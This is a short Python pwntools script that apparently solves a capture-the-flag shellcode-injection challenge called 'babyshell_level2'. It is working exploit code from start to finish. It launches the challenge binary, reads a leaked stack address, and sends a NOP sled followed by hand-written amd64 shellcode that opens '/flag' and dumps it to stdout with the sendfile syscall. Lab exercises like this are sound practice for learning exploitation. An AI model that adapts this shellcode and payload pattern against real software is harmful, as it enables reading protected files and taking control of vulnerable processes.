from pwn import *

exe = context.binary = ELF("/challenge/babyshell_level2")
r = exe.process()
r.recvuntil(b"stack at ")
leak = r.recvline().strip(b"!\n").decode()
leak = int(leak, 16)
log.info(hex(leak))
shellcode = asm ('''
        xor rax, rax
        push rax
        mov rbx, 0x67616c662f
        push rbx
        push rsp
        pop rdi
        push 0x2
        pop rax
        xor rsi, rsi
        syscall

        push 1
        pop rdi
        mov rsi, rax
        xor rdx, rdx
        push 1000
        pop r10
        push 0x28
        pop rax
        syscall
    ''',arch='amd64')
payload = asm("nop")*600
payload += shellcode
r.sendline(payload)
r.interactive()

